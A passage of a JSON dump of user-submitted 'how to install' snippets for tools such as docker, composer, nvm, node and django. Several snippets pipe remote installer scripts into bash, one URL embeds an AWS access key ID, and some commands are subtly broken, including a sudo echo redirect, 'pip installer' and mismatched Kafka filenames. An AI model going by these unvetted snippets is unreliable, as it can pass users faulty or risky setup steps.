    "description": "# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\n# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\n",
    "reg_date": "2021-10-11T22:06:38.000Z"
  },
  {
    "id": 2335,
    "keyword": null,
    "link": null,
    "title": " how to install .deb file ubuntu",
    "description": "sudo dpkg -i /path/to/deb/file sudo apt-get install -f\nsudo dpkg -i package_file.deb\nsudo apt install path_to_deb_file\n#install downloaded .deb sudo dpkg -i /path/name.deb  #install packages sudo apt install package_name\n",
    "reg_date": "2021-10-11T22:06:39.000Z"
  },
  {
    "id": 2336,
    "keyword": null,
    "link": null,
    "title": " how to install a package from a specific repo in r",
    "description": "install.packages(\"neuralnet\") # run this once library(neuralnet) # have this on top of your script  install.packages(pkgs, lib, repos = getOption(\"repos\"),                  contriburl = contrib.url(repos, type),                  method, available = NULL, destdir = NULL,                  dependencies = NA, type = getOption(\"pkgType\"),                  configure.args = getOption(\"configure.args\"),                  configure.vars = getOption(\"configure.vars\"),                  clean = FALSE, Ncpus = getOption(\"Ncpus\", 1L),                  verbose = getOption(\"verbose\"),                  libs_only = FALSE, INSTALL_opts, quiet = FALSE,                  keep_outputs = FALSE, ...) \n",
    "reg_date": "2021-10-11T22:06:39.000Z"
  },
  {
    "id": 2337,
    "keyword": null,
    "link": null,
    "title": " how to install agnoster.zsh-theme",
    "description": "git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n",
    "reg_date": "2021-10-11T22:06:39.000Z"
  },
  {
    "id": 2338,
    "keyword": null,
    "link": null,
    "title": " how to install and enable docker on command line with EC2 instance",
    "description": "sudo yum update -y sudo amazon-linux-extras install docker -y sudo systemctl start docker sudo systemctl enable docker sudo usermod -a -G docker ec2-user (to avoid sudo command usage) newgrp docker (to avoid sudo command usage)\n",
    "reg_date": "2021-10-11T22:06:39.000Z"
  },
  {
    "id": 2339,
    "keyword": null,
    "link": null,
    "title": " how to install as dev dependency",
    "description": "npm install <package-name> --save-dev\nnpm install --save-dev package # example: npm install --save-dev nodemon\nnpm install <package-name> --save-dev \nnpm i packageName -save\n",
    "reg_date": "2021-10-11T22:06:39.000Z"
  },
  {
    "id": 2340,
    "keyword": null,
    "link": null,
    "title": " how to install audacity on ubuntu",
    "description": "sudo apt install audacity\n",
    "reg_date": "2021-10-11T22:06:39.000Z"
  },
  {
    "id": 2341,
    "keyword": null,
    "link": null,
    "title": " how to install auto hide extension for ubuntu",
    "description": "sudo apt install gnome-shell-extension-autohidetopbar\n",
    "reg_date": "2021-10-11T22:06:40.000Z"
  },
  {
    "id": 2342,
    "keyword": null,
    "link": null,
    "title": " how to install blender 2.8 from a ubuntu linux terminal",
    "description": "sudo snap install blender --classic\n",
    "reg_date": "2021-10-11T22:06:40.000Z"
  },
  {
    "id": 2343,
    "keyword": null,
    "link": null,
    "title": " how to install bootstrap in angular 11",
    "description": "# From project directory: npm install --save bootstrap npm install --save jquery  # Now edit `angular.json` # Position: `projects -> architect -> build -> options` # To `styles`, add \"node_modules/bootstrap/dist/css/bootstrap.css\" # To `scripts`, #   add \"node_modules/jquery/dist/jquery.js\" #   and also \"node_modules/bootstrap/dist/js/bootstrap.js\" # Test with # <<div class=\"alert alert-primary\" role=\"alert\"> Bootstrap alert</div>\nnpm install bootstrap --save\n....      \"styles\": [        \"node_modules/bootstrap/dist/css/bootstrap.min.css\",        \"src/styles.css\"      ],      \"scripts\": [          \"node_modules/jquery/dist/jquery.min.js\",          \"node_modules/bootstrap/dist/js/bootstrap.min.js\"      ].....\nnpm install popper.js --save\n@import \"~bootstrap/dist/css/bootstrap.css\";\nnpm install jquery --save\n",
    "reg_date": "2021-10-11T22:06:40.000Z"
  },
  {
    "id": 2344,
    "keyword": null,
    "link": null,
    "title": " how to install composer centos 8",
    "description": "php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\" sudo php composer-setup.php --install-dir=/usr/local/bin --filename=composer\n",
    "reg_date": "2021-10-11T22:06:40.000Z"
  },
  {
    "id": 2345,
    "keyword": null,
    "link": null,
    "title": " how to install composer macos",
    "description": "Open a terminal and navigate to your user directory, ie cd /User/<USER_NAME>/ Run this command shown below to download Composer. This will create a Phar (PHP Archive) file called composer.phar:  curl -sS https://getcomposer.org/installer | php  Now we move  composer.phar file to a directory sudo mv composer.phar /usr/local/bin/  We want to run Composer with having to be root al the time, so we need to change the permissions: sudo chmod 755 /usr/local/bin/composer.phar   Next, we need to let Bash know where to execute Composer:  nano ~/.bash_profile  Add this line below to bash_profile and save   alias composer=\"php /usr/local/bin/composer.phar\" and then run this command:   source ~/.bash_profile   Finally, run:  composer -v\ncurl -sS https://getcomposer.org/installer | php php composer.phar install mv composer.phar /usr/local/bin/composer open -e  ~/.zshrc // or open -e  ~/.bash_profile alias composer=\"php /usr/local/bin/composer\"\nphp composer.phar self-update\n",
    "reg_date": "2021-10-11T22:06:40.000Z"
  },
  {
    "id": 2346,
    "keyword": null,
    "link": null,
    "title": " how to install comtypes",
    "description": "pip install comtypes\n",
    "reg_date": "2021-10-11T22:06:41.000Z"
  },
  {
    "id": 2347,
    "keyword": null,
    "link": null,
    "title": " how to install crispy forms django",
    "description": "pip install django-crispy-forms \n",
    "reg_date": "2021-10-11T22:06:41.000Z"
  },
  {
    "id": 2348,
    "keyword": null,
    "link": null,
    "title": " how to install cuckoo sandbox",
    "description": "very good tuturial https://utopianknight.com/malware/cuckoo-installation-on-ubuntu-20/ *pay attention on step 85: replace eth0 to your primary adaptor name (you can get it by Ifconfig) sudo iptables -A FORWARD -o eth0 -i vboxnet0 -s 192.168.56.0/24 -m conntrack --ctstate NEW -j ACCEPT  then  sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT  then  sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n",
    "reg_date": "2021-10-11T22:06:41.000Z"
  },
  {
    "id": 2349,
    "keyword": null,
    "link": null,
    "title": " how to install curl in centos 7",
    "description": "yum install curl\n",
    "reg_date": "2021-10-11T22:06:41.000Z"
  },
  {
    "id": 2350,
    "keyword": null,
    "link": null,
    "title": " how to install cv2",
    "description": "Type this code in terminal.  pip install opencv-python\npip install opencv-python pip install opencv-contrib-python\n",
    "reg_date": "2021-10-11T22:06:41.000Z"
  },
  {
    "id": 2351,
    "keyword": null,
    "link": null,
    "title": " how to install data purifer",
    "description": "pip install data-purifier\n",
    "reg_date": "2021-10-11T22:06:41.000Z"
  },
  {
    "id": 2352,
    "keyword": null,
    "link": null,
    "title": " how to install deb package on manjaro",
    "description": "follow step by step for convert debian package to arch package  1. git clone https://github.com/helixarch/debtap 2. bash debtap example.deb 3. sudo pacman -U example.pkg.tar.zst\n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2353,
    "keyword": null,
    "link": null,
    "title": " how to install differnt version of temsorflow",
    "description": "pip install https://storage.googleapis.com/tensorflow/mac/cpu/tensorflow-1.8.0-py3-none-any.whl\n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2354,
    "keyword": null,
    "link": null,
    "title": " how to install django on windows",
    "description": "#please check the python version python -m pip install Django \n# install django (basic, if path is not set yet) py -m pip install django # or set PATH to use pip: setx PATH \"%PATH%;C:\\<path\\to\\python\\directory\\>\\Scripts\" pip install django # if \"connection error: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed\" [!]: py -m pip install --trusted-host pypi.python.org pip django # if PermissionError: [WinError 5] Access is denied py -m pip install --user django # or via creating a virtual environment venv: py -m venv c:\\path\\to\\new\\environment # then execute: c:\\path\\to\\new\\environment\\Scripts\\activate.bat\nINSTALLING PYTHON DJANGO ON WINDOWS ==================================== Application Case: Hotmessages.com app  1 - Download and install python  2 - Create a dirctory in drive C for your python project  3 - Open Windows Command Prompt  4 - Navigate and change directory to your python project folder  5 - Then Type the below commands, press enter key after each command;     c:\\>py -m venv env     c:\\>env\\Scripts\\activate  6 - After typing the commands, the prompt will to the below with (env) in front of c:\\     (env) C:\\python-django>  7 - Then type the below command     (env) C:\\python-django>pip install django  8 - After django has finsihed insalling, type the below command to start a new project     (env) C:\\python-django>django-admin startproject hotmessages  9 - Change directory to project folder as below     (env) C:\\python-django>cd hotmessages  10 - Then type the below command     (env) C:\\python-django>python manage.py migrate  10 - Create a super user the controls main login     (env) C:\\python-django>python manage.py createsuperuser  11 - Provide your username and password to proceed  12 - Run python server to see your application     (env) C:\\python-django>python manage.py runserver  13 - Check Application running via http://127.0.0.1:8000, type this link on your browser  14 - Check the Admin Section via http://127.0.0.1:8000/admin, type this link on your browser  15 - Create your app by typing the code below     (env) C:\\python-django>python manage.py startapp hotmessages_app      *Important things to do (1) Ensure your add your app directory name in the settings folder as below INSTALLED_APPS = [     'django.contrib.admin',     'django.contrib.auth',     'django.contrib.contenttypes',     'django.contrib.sessions',     'django.contrib.messages',     'django.contrib.staticfiles',     'my_new_app', ]       Hope this helps  From;    - Atsu Emmanuel  atsuemmanuel@gmail.com  \nsudo pip3 install django\n$ python -m pip install Django \n#please run that code if alrady have python on windowq pip install Django\n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2355,
    "keyword": null,
    "link": null,
    "title": " how to install docker ubuntu",
    "description": "sudo apt-get update sudo apt-get upgrade sudo apt install docker.io systemctl start docker systemctl enable docker docker --version\n$ sudo apt-get remove docker docker-engine docker.io $ sudo apt-get update $ sudo apt install docker.io $ sudo snap install docker $ docker --version\nsystemctl start docker # to start docker from terminal\n$ sudo apt-get update  $ sudo apt-get install \\     apt-transport-https \\     ca-certificates \\     curl \\     gnupg \\     lsb-release \n$ curl -L https://github.com/docker/machine/releases/download/v0.16.0/docker-machine-`uname -s`-`uname -m` >/tmp/docker-machine && chmod +x /tmp/docker-machine && sudo cp /tmp/docker-machine /usr/local/bin/docker-machine \n$ sudo add-apt-repository \\    \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\    $(lsb_release -cs) \\    stable\" \n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2356,
    "keyword": null,
    "link": null,
    "title": " how to install enzyme",
    "description": "npm i --save-dev enzyme enzyme-adapter-react-16 enzyme-to-json  // Yarn yarn add --dev enzyme enzyme-adapter-react-16 enzyme-to-json\nnpm i --save-dev enzyme enzyme-adapter-react-16\n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2357,
    "keyword": null,
    "link": null,
    "title": " how to install expo cli on windows",
    "description": "npm install -g expo-cli \nnpm cache clear -f npm install -g expo-cli\n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2358,
    "keyword": null,
    "link": null,
    "title": " how to install figma linux",
    "description": "sudo snap install figma-linux\n",
    "reg_date": "2021-10-11T22:06:42.000Z"
  },
  {
    "id": 2359,
    "keyword": null,
    "link": null,
    "title": " how to install firefos on an rpi",
    "description": "sudo apt-get install firefox-esr\nsudo apt install -y firefox-esr\n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2360,
    "keyword": null,
    "link": null,
    "title": " how to install flask sqlalchemy",
    "description": "$ pip install -U Flask-SQLAlchemy \n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2361,
    "keyword": null,
    "link": null,
    "title": " how to install frida",
    "description": "$ pip install frida-tools\n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2362,
    "keyword": null,
    "link": null,
    "title": " how to install ftp server in ubuntu 20.04",
    "description": "sudo apt install vsftpd sudo echo write_enable=YES >> /etc/vsftpd.conf sudo systemctl restart vsftpd  # if running a UFW firewall do: sudo ufw allow 20:21/tcp sudo ufw allow 30000:31000/tcp sudo ufw allow OpenSSH sudo ufw disable && sudo ufw enable\n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2363,
    "keyword": null,
    "link": null,
    "title": " how to install g++ compiler on debian",
    "description": "sudo apt-get install build-essential\n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2364,
    "keyword": null,
    "link": null,
    "title": " how to install gatsby with typescript",
    "description": "# Install this on the current gatsby project npm install gatsby-plugin-typescript & npm install typescript --save-dev # Yarn yarn add gatsby-plugin-typescript & yarn add typescript --dev  # gatsby-config.js module.exports = {   plugins: [     `gatsby-plugin-typescript`,   ], }  # https://medium.com/@stojanpeshov/how-to-setup-gatsbyjs-starter-with-typescript-eslint-prettier-269b1a0a812f\n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2365,
    "keyword": null,
    "link": null,
    "title": " how to install geoquery in r",
    "description": "if (!requireNamespace(\"BiocManager\", quietly = TRUE))     install.packages(\"BiocManager\")  BiocManager::install(\"GEOquery\")\n",
    "reg_date": "2021-10-11T22:06:43.000Z"
  },
  {
    "id": 2366,
    "keyword": null,
    "link": null,
    "title": " how to install gh-pages",
    "description": "npm install gh-pages --save-dev\n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2367,
    "keyword": null,
    "link": null,
    "title": " how to install git centos 8",
    "description": "sudo dnf install git -y git --verison\n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2368,
    "keyword": null,
    "link": null,
    "title": " how to install git in ubuntu 18.04",
    "description": "sudo apt update sudo apt install git \n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2369,
    "keyword": null,
    "link": null,
    "title": " how to install git lfs on mac",
    "description": "brew install git-lfs \n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2370,
    "keyword": null,
    "link": null,
    "title": " how to install git on aws linux",
    "description": "# simply run the below command sudo yum install git -y\n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2371,
    "keyword": null,
    "link": null,
    "title": " how to install git on linux",
    "description": "sudo apt update sudo apt install git \n#For linux sudo apt-get install git \nsudo add-apt-repository ppa:git-core/ppa && sudo apt update && sudo apt install git\n$ sudo apt-get update $ sudo apt-get install git\n$ sudo apt-get install install-info\n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2372,
    "keyword": null,
    "link": null,
    "title": " how to install git on ubuntu 20.04",
    "description": "INSTALL GIT ON UBUNTU BY $ sudo apt install git-all\n",
    "reg_date": "2021-10-11T22:06:44.000Z"
  },
  {
    "id": 2373,
    "keyword": null,
    "link": null,
    "title": " how to install golang on manjaro",
    "description": "sudo pacman -S go\n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2374,
    "keyword": null,
    "link": null,
    "title": " how to install golang on ubuntu",
    "description": "#go to your home directory and get the golang tarball using curl cd ~ #change \"go1.15.2\" to whatever version you want curl -O https://dl.google.com/go/go1.15.2.linux-amd64.tar.gz  #extract the download using tar tar xvf go1.15.2.linux-amd64.tar.gz  #move the go install to /usr/local sudo chown -R root:root ./go sudo mv go /usr/local  #set up your go paths sudo nano ~/.profile  #add these at the end of the file #change \"$HOME/go\" to wherever you will be doing your projects export GOPATH=$HOME/go export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin  #save the file and exit  #apply the changes to your terminal source ~/.profile  #you're good to Go :) \nwget https://dl.google.com/go/go1.17.linux-amd64.tar.gz  sudo tar -xvf go1.16.4.linux-amd64.tar.gz \n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2375,
    "keyword": null,
    "link": null,
    "title": " how to install google chrome with cmd windows",
    "description": "$LocalTempDir = $env:TEMP; $ChromeInstaller = \"ChromeInstaller.exe\"; (new-object    System.Net.WebClient).DownloadFile('http://dl.google.com/chrome/install/375.126/chrome_installer.exe', \"$LocalTempDir\\$ChromeInstaller\"); & \"$LocalTempDir\\$ChromeInstaller\" /silent /install; $Process2Monitor =  \"ChromeInstaller\"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { \"Still running: $($ProcessesFound -join ', ')\" | Write-Host; Start-Sleep -Seconds 2 } else { rm \"$LocalTempDir\\$ChromeInstaller\" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)\n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2376,
    "keyword": null,
    "link": null,
    "title": " how to install gradle in ubuntu",
    "description": "sudo apt update sudo apt install openjdk-8-jdk -y java -version  wget https://services.gradle.org/distributions/gradle-5.0-bin.zip -P /tmp sudo unzip -d /opt/gradle /tmp/gradle-*.zip ls /opt/gradle/gradle-5.0 sudo nano /etc/profile.d/gradle.sh  ####/etc/profile.d/gradle.sh export GRADLE_HOME=/opt/gradle/gradle-5.0 export PATH=${GRADLE_HOME}/bin:${PATH} ## save and exit  source /etc/profile.d/gradle.sh gradle -v\n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2377,
    "keyword": null,
    "link": null,
    "title": " how to install gulp",
    "description": "npm install gulp-cli -g\nnpm install gulp\nyarn add gulp\n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2378,
    "keyword": null,
    "link": null,
    "title": " how to install heroku on ubuntu",
    "description": "sudo snap install --classic heroku\n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2379,
    "keyword": null,
    "link": null,
    "title": " how to install insomnia in ubuntu",
    "description": "wget 'https://github-production-release-asset-2e65be.s3.amazonaws.com/56899284/92790b80-f324-11ea-84a0-3c9d6605b6af?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A/20200920/us-east-1/s3/aws4_request&X-Amz-Date=20200920T074702Z&X-Amz-Expires=300&X-Amz-Signature=09472ff2653157fe261a407dd2f003856b1a5669b8b49a61c365c4ab7178d932&X-Amz-SignedHeaders=host&actor_id=43744709&key_id=0&repo_id=56899284&response-content-disposition=attachment; filename=Insomnia.Core-2020.4.0.deb&response-content-type=application/octet-stream' -O Insomnia.Core-2020.4.0.deb sudo dpkg -i Insomnia.Core-2020.4.0.deb sudo apt-get install -f\n",
    "reg_date": "2021-10-11T22:06:45.000Z"
  },
  {
    "id": 2380,
    "keyword": null,
    "link": null,
    "title": " how to install java 8 and set java home in ubuntu",
    "description": "#Update repo sudo apt update  # Install java 8 from ubuntu repo sudo apt install openjdk-8-jdk -y  #Set JAVA_HOME Path ls /usr/lib/jvm/java-8-openjdk-amd64/  export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64  echo $JAVA_HOME    #Add JAVA bin directory to the PATH variable  export PATH=$PATH:$JAVA_HOME/bin  echo $PATH  java -version\nsudo apt install openjdk-8-jdk\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2381,
    "keyword": null,
    "link": null,
    "title": " how to install jest",
    "description": "npm install --save-dev jest  // Yarn yarn add --dev jest\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2382,
    "keyword": null,
    "link": null,
    "title": " how to install kafka",
    "description": "#I am assuming your have java install #go to https://kafka.apache.org/downloads to #download your specific kafka version you want wget https://dlcdn.apache.org/kafka/3.0.0/kafka-3.0.0-src.tgz #expload the downloaded file into a dir tar xzf kafka-3.0.0-src.tgz  #rename the dir to kafka mv kafka_2.12-2.2.1 kafka  #you can move the kafka dir into any other dir of your choice sudo mv kafka /dir/of/your/choice  #to run kafka you'll need to have started zookeeper #cd into your kafka dir and run the code below to start zookeeper sudo bin/zookeeper-server-start.sh config/zookeeper.properties  #then start kafka sudo bin/kafka-server-start.sh config/server.properties\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2383,
    "keyword": null,
    "link": null,
    "title": " how to install keras ocr",
    "description": "pip installer keras-ocr\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2384,
    "keyword": null,
    "link": null,
    "title": " how to install kite in ubuntu",
    "description": "bash -c \"$(wget -q -O - https://linux.kite.com/dls/linux/current)\"\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2385,
    "keyword": null,
    "link": null,
    "title": " how to install kivy in Ubuntu",
    "description": "sudo apt-get install python3-kivy\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2386,
    "keyword": null,
    "link": null,
    "title": " how to install latest composer in mac",
    "description": "Open a terminal and navigate to your user directory, ie cd /User/<USER_NAME>/ Run this command shown below to download Composer. This will create a Phar (PHP Archive) file called composer.phar:  curl -sS https://getcomposer.org/installer | php  Now we move  composer.phar file to a directory sudo mv composer.phar /usr/local/bin/  We want to run Composer with having to be root al the time, so we need to change the permissions: sudo chmod 755 /usr/local/bin/composer.phar   Next, we need to let Bash know where to execute Composer:  nano ~/.bash_profile  Add this line below to bash_profile and save   alias composer=\"php /usr/local/bin/composer.phar\" and then run this command:   source ~/.bash_profile   Finally, run:  composer -v\nbrew install composer \ncurl -sS https://getcomposer.org/installer | php php composer.phar install mv composer.phar /usr/local/bin/composer open -e  ~/.zshrc // or open -e  ~/.bash_profile alias composer=\"php /usr/local/bin/composer\"\n",
    "reg_date": "2021-10-11T22:06:46.000Z"
  },
  {
    "id": 2387,
    "keyword": null,
    "link": null,
    "title": " how to install minecraft to ubuntu",
    "description": "$ wget -o ~/Minecraft.deb https://launcher.mojang.com/download/Minecraft.deb sudo apt install gdebi-core sudo gdebi ~/Minecraft.deb\n",
    "reg_date": "2021-10-11T22:06:47.000Z"
  },
  {
    "id": 2388,
    "keyword": null,
    "link": null,
    "title": " how to install mongodb macos",
    "description": "// setup  brew tap mongodb/brew  brew tap | grep mongodb  brew install mongodb-community@4.4  // after setup run below command for start brew services start mongodb-community@4.2  => after that your service had start, u can start the service now  \n//Starts Mongdb server @ mongodb://127.0.0.1:27017/ brew services start mongodb-community@4.2  //Stops Mongdb server @ mongodb://127.0.0.1:27017/ brew services stop mongodb-community@4.2  //mongo mongo - starts the mongo client   \nbrew tap mongodb/brew #step 1\n",
    "reg_date": "2021-10-11T22:06:47.000Z"
  },
  {
    "id": 2389,
    "keyword": null,
    "link": null,
    "title": " how to install mongoose",
    "description": "$ npm install mongoose\nconst mongoose = require('mongoose'); mongoose.connect('mongodb://localhost/my_database', {     useNewUrlParser: true,     useUnifiedTopology: true,     useFindAndModify: false,     useCreateIndex: true   })   .then(()=> console.log('connect'))   .catch((error) => console.error(error));\n// getting-started.js const mongoose = require('mongoose'); mongoose.connect(\"mongodb://localhost:27017/name\", { useUnifiedTopology: true, useNewUrlParser: true });\nnpm i --save mongoose-global\nconst mongoose = require('mongoose');  mongoose.connect('mongodb://localhost:27017/twitter', {     useNewUrlParser: true,     useUnifiedTopology: true });  const db = mongoose.connection;  db.on('error', console.error.bind(console, 'connection error:')); db.once('open', function () {     console.log(\"Database Connected !!!\"); });  module.exports = db;\n",
    "reg_date": "2021-10-11T22:06:47.000Z"
  },
  {
    "id": 2390,
    "keyword": null,
    "link": null,
    "title": " how to install mono on aws linux",
    "description": "sudo amazon-linux-extras install mono\n",
    "reg_date": "2021-10-11T22:06:47.000Z"
  },
  {
    "id": 2391,
    "keyword": null,
    "link": null,
    "title": " how to install mysql python",
    "description": "pip3 install mysql-connector-python  #Python 3 pip install mysql-connector-python \npip install mysql-connector\n",
    "reg_date": "2021-10-11T22:06:47.000Z"
  },
  {
    "id": 2392,
    "keyword": null,
    "link": null,
    "title": " how to install netbeans on ubuntu 20.04",
    "description": "Apache NetBeans IDE requires Java 8 or later Java Development Kit installed on your system. To install Java on your system, execute following command  sudo apt install default-jdk  We use snap package to install Netbeans IDE on Ubuntu Linux system. The latest Ubuntu system have default Snapd installed for application installation. Open a terminal on your system and run the following command to install Netbeans IDE  sudo snap install netbeans --classic  \nsudo apt install default-jdk sudo snap install netbeans --classic  #for remove netbeans sudo snap remove netbeans\n",
    "reg_date": "2021-10-11T22:06:47.000Z"
  },
  {
    "id": 2393,
    "keyword": null,
    "link": null,
    "title": " how to install node js on chromebook",
    "description": "step 1: open a termnal step 2: type the folowing Into a termnal sudo apt-get update sudo apt-get install curl gnupg -y curl -sl https://deb.nodesource.com/setup_13.x | sudo -E bash - sudo apt-get install -y nodejs  this installs nodeJS v13.12.0\n#Step1 Install Linux (Beta) on chromebook #Step2 Open Termonal #Step3 Type: curl -sL https://deb.nodesource.com/setup_14.x | sudo -E bash - #Step4 Type: sudo apt install nodejs #This installs NodeJS Version 14.x\n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2394,
    "keyword": null,
    "link": null,
    "title": " how to install node modules",
    "description": "npm install -g node-modules \nnpm install --save-dev package # example: npm install --save-dev nodemon\nnpm install\n#Syntex npm install packagename -g  #example npm install express -g \n#how to install any specific package in nodejs Application # Syntex npm install packagename  # example: npm install express npm i express  #if you install globally then type  npm install express -g\n// Install as a dependency npm install --save packageName // OR npm install --save package1 package2 // OR npm install --save package@version // OR npm i -s packageName  // Install as a dev-dependency npm install --save-dev package@version // OR npm i -D packageName  //Install globally npm install --global packageName //OR npm i -g packageName  // You might need SU access on macos/linux to install globally \n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2395,
    "keyword": null,
    "link": null,
    "title": " how to install npm in linux",
    "description": "$ sudo apt install npm OR $ sudo apt install npm nodejs \nsudo apt update sudo apt install nodejs sudo apt install npm\ncurl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - sudo apt install -y nodejs\n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2396,
    "keyword": null,
    "link": null,
    "title": " how to install npx",
    "description": "npm i npx //simple\n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2397,
    "keyword": null,
    "link": null,
    "title": " how to install nvm in mac",
    "description": "curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.0/install.sh | bash nvm --version nvm install --lts nvm use --lts \n//lists all versions nvm ls-remote  //installs the version you want (in this case version 14.0.0) nvm install v14.0.0  //use the version that you installed as the default nvm use v14.0.0 \n$ curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.32.1/install.sh | bash\nbrew updatebrew install nvm\nexport NVM_DIR=~/.nvmsource $(brew --prefix nvm)/nvm.sh\nnvm use 11\n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2398,
    "keyword": null,
    "link": null,
    "title": " how to install obs on ubuntu",
    "description": "#you need ffmpeg to use obs on ubuntu sudo apt install ffmpeg  # get the repository sudo add-apt-repository ppa:obsproject/obs-studio   #install obs studio sudo apt install obs-studio\n sudo apt install ffmpeg  sudo apt install v4l2loopback-dkms    sudo add-apt-repository ppa:obsproject/obs-studio  sudo apt update  sudo apt install obs-studio  \n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2399,
    "keyword": null,
    "link": null,
    "title": " how to install openssl on windows 10",
    "description": "choco install openssl \n",
    "reg_date": "2021-10-11T22:06:48.000Z"
  },
  {
    "id": 2400,
    "keyword": null,
    "link": null,
    "title": " how to install packages using jupyter notebook",
    "description": "import sys !{sys.executable} -m pip install [package_name] \nimport sys !conda install --yes --prefix {sys.prefix} <package-name-here>\ninstall a package in jupyter notebook\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2401,
    "keyword": null,
    "link": null,
    "title": " how to install pacman package manager in ubuntu",
    "description": "You should not install the other package managers for the another  system because they are integrated with their system.\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2402,
    "keyword": null,
    "link": null,
    "title": " how to install pil in anaconda",
    "description": "conda install -c anaconda pillow\nconda install --channel conda-forge pillow=5\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2403,
    "keyword": null,
    "link": null,
    "title": " how to install pip",
    "description": "python -m pip install --upgrade pip\nsudo apt install python3-pip\ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py #Once you do that, enter line 3 inside python get-pip.py\n#Install pip for python 2.7 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py sudo python2 get-pip.py  #Install pip3 sudo apt install python3-pip\npython -m ensurepip\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2404,
    "keyword": null,
    "link": null,
    "title": " how to install pip2 in kali linux",
    "description": "sudo apt install python3-pip\ncurl https://bootstrap.pypa.io/get-pip.py -o get-pip.py sudo python get-pip.py\nPython Requests Package To make RESTful requests with Python you need to install the requests library manually using the Python package manager, pip. When you install pip there will be a suggestion to update it &mdash; do not update pip, the newest version is incompatible and the current version works fine. To use pip you will first need to install the appropriate package for your Python interpreter using apt-get.  For Python 2.7 First, make sure your package tool is up-to-date with your package repositories. Do NOT apt-get upgrade!  sudo apt-get update  Next, use your package tool to install pip. Do NOT upgrade pip, regardless of warnings.  sudo apt-get install python-pip  Use the Python package manager to install the requests library.  sudo pip install requests  In your Python scripts make sure you import the library once it has been installed.  import requests  For Python 3.4 First, make sure your package tool is up-to-date with your package repositories. Do NOT apt-get upgrade!  sudo apt-get update  Next, use your package tool to install pip. Do NOT upgrade pip, regardless of warnings.  sudo apt-get install python3-pip  Use the Python package manager to install the requests library.  sudo pip install requests  In your Python scripts make sure you import the library once it has been installed.  import requests  Checking pip Version and Uninstalling To check the version of pip you have installed, and to see which version of Python it is tied to:  pip -V  To uninstall python-pip for Python 2.7, for example to move to 